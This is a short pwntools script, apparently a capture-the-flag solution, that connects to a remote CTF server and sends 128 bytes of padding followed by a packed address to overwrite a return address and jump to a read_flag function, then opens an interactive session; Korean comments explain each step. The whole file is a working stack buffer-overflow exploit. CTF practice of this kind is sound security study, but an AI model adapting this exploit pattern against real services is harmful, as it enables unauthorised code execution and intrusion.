from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3001)

shell = 0x804849b

pay = "A"*128            # local_94에 크기만큼 더미값으로 채워줌
pay += p32(shell)      # ret 주소에다가 read_flag 함수 메모리 주소 덮어씀

p.sendline(pay)
p.interactive()